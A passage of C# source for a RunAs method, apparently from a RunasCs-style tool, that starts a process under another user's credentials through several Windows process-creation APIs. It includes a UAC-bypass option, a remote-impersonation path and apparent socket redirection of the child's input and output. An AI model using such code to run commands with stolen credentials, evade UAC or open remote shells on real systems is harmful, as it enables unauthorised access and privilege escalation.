    public string RunAs(string username, string password, string cmd, string domainName, uint processTimeout, int logonType, int createProcessFunction, string[] remote, bool forceUserProfileCreation, bool bypassUac, bool remoteImpersonation, bool passthrough)
    /*
        int createProcessFunction:
            0: CreateProcessAsUserW();
            1: CreateProcessWithTokenW();
            2: CreateProcessWithLogonW();
    */
    {
        string commandLine = ParseCommonProcessesInCommandline(cmd);
        RunExMainClass.VerboseLog("Resolved command line: " + commandLine);
        // passthrough: let child inherit our console so output streams in real-time
        this.creationFlags = passthrough ? 0u : this.creationFlags;
        int logonProvider = NativeMethods.LOGON32_PROVIDER_DEFAULT;
        int logonTypeNotFiltered = 0;
        NativeMethods.STARTUPINFO startupInfo = new NativeMethods.STARTUPINFO();
        startupInfo.cb = Marshal.SizeOf(startupInfo);
        startupInfo.lpReserved = null;
        NativeMethods.ProcessInformation processInfo = new NativeMethods.ProcessInformation();
        // setup the std handles for the process based on the user input
        RunasSetupStdHandlesForProcess(processTimeout, remote, passthrough, ref startupInfo, out this.hOutputWrite, out this.hErrorWrite, out this.hOutputRead, out this.hStdInput, out socket);
        // add the proper DACL on the window station and desktop that will be used
        RunExMainClass.VerboseLog("Setting up window station DACL");
        this.stationDaclObj = new WindowStationDACL();
        string desktopName = this.stationDaclObj.AddAclToActiveWindowStation(domainName, username, logonType);
        startupInfo.lpDesktop = desktopName;
        RunExMainClass.VerboseLog("Using desktop: " + desktopName);
        // setup proper logon provider for new credentials (9) logons
        if (logonType == NativeMethods.LOGON32_LOGON_NEW_CREDENTIALS) {
            logonProvider = NativeMethods.LOGON32_PROVIDER_WINNT50;
            RunExMainClass.VerboseLog("Logon provider: LOGON32_PROVIDER_WINNT50 (for NewCredentials)");
            if (domainName == "") // fixing bugs in seclogon when using LOGON32_LOGON_NEW_CREDENTIALS...
                domainName = ".";
        }
        // we check if the user has been granted the logon type requested, if not we show a message suggesting which logon type can be used to succesfully logon
        RunExMainClass.VerboseLog("Checking if logon type " + logonType + " is available for user");
        CheckAvailableUserLogonType(username, password, domainName, logonType, logonProvider);
        RunExMainClass.VerboseLog("Logon type check passed");
        // Use the proper CreateProcess* function
        if (remoteImpersonation) {
            RunExMainClass.VerboseLog("Using Remote Impersonation path");
            RunasRemoteImpersonation(username, domainName, password, logonType, logonProvider, commandLine, ref startupInfo, ref processInfo, ref logonTypeNotFiltered);
        } else {
            bool userProfileExists;
            uint logonFlags = 0;
            userProfileExists = IsUserProfileCreated(username, password, domainName, logonType);
            RunExMainClass.VerboseLog("User profile exists: " + userProfileExists);
            // we load the user profile only if it has been already created or the creation is forced from the flag --force-profile
            if (userProfileExists || forceUserProfileCreation)
                logonFlags = NativeMethods.LOGON_WITH_PROFILE;
            if (logonType != NativeMethods.LOGON32_LOGON_NEW_CREDENTIALS && !forceUserProfileCreation && !userProfileExists)
                Console.Out.WriteLine("[*] Warning: User profile directory for user " + username + " does not exist. Use --force-profile if you want to force the creation.");
            if (createProcessFunction == 2) {
                RunExMainClass.VerboseLog("Using CreateProcessWithLogonW path");
                RunasCreateProcessWithLogonW(username, domainName, password, logonType, logonFlags, commandLine, bypassUac, ref startupInfo, ref processInfo, ref logonTypeNotFiltered);
            } else {
                if (bypassUac)
                    throw new RunExException(String.Format("The flag --bypass-uac is not compatible with {0} but only with --function '2' (CreateProcessWithLogonW)", GetProcessFunction(createProcessFunction)));
                if (createProcessFunction == 0) {
                    RunExMainClass.VerboseLog("Using CreateProcessAsUserW path");
                    RunasCreateProcessAsUserW(username, domainName, password, logonType, logonProvider, commandLine, forceUserProfileCreation, userProfileExists, ref startupInfo, ref processInfo, ref logonTypeNotFiltered);
                } else if (createProcessFunction == 1) {
                    RunExMainClass.VerboseLog("Using CreateProcessWithTokenW path");
                    RunasCreateProcessWithTokenW(username, domainName, password, commandLine, logonType, logonFlags, logonProvider, ref startupInfo, ref processInfo, ref logonTypeNotFiltered);
                }
            }
        }
        RunExMainClass.VerboseLog("Process created with PID: " + processInfo.processId);
        Console.Out.Flush();  // flushing console before waiting for child process execution
        string output = "";
        if (passthrough) {
            RunExMainClass.VerboseLog("Passthrough: closing parent-side handles, waiting for child exit");
            // Close our copies — the child has its own via inheritance
            NativeMethods.CloseHandle(this.hStdInput);
            NativeMethods.CloseHandle(this.hOutputWrite);
            NativeMethods.CloseHandle(this.hErrorWrite);
            this.hStdInput = IntPtr.Zero;
            this.hOutputWrite = IntPtr.Zero;
            this.hErrorWrite = IntPtr.Zero;
            NativeMethods.WaitForSingleObject(processInfo.process, 0xFFFFFFFF); // INFINITE
            uint exitCode = 0;
            NativeMethods.GetExitCodeProcess(processInfo.process, out exitCode);
            this.ExitCode = (int)exitCode;
            RunExMainClass.VerboseLog("Child exited with code: " + this.ExitCode);
        } else if (processTimeout > 0) {
            RunExMainClass.VerboseLog("Waiting for process output (timeout: " + processTimeout + " ms)");
            NativeMethods.CloseHandle(this.hOutputWrite);
            NativeMethods.CloseHandle(this.hErrorWrite);
            this.hOutputWrite = IntPtr.Zero;
            this.hErrorWrite = IntPtr.Zero;
            NativeMethods.WaitForSingleObject(processInfo.process, processTimeout);
            output += "\r\n" + ReadOutputFromPipe(this.hOutputRead);
        } else {
            int sessionId = System.Diagnostics.Process.GetCurrentProcess().SessionId;
            if (remoteImpersonation)
                output += "\r\n[+] Running in session " + sessionId.ToString() + " with process function 'Remote Impersonation' \r\n";
            else
                output += "\r\n[+] Running in session " + sessionId.ToString() + " with process function " + GetProcessFunction(createProcessFunction) + "\r\n";
            output += "[+] Using Station\\Desktop: " + desktopName + "\r\n";
            output += "[+] Async process '" + commandLine + "' with pid " + processInfo.processId + " created in background.\r\n";
        }
        NativeMethods.CloseHandle(processInfo.process);
        NativeMethods.CloseHandle(processInfo.thread);
        this.CleanupHandles();
        return output;
    }
}
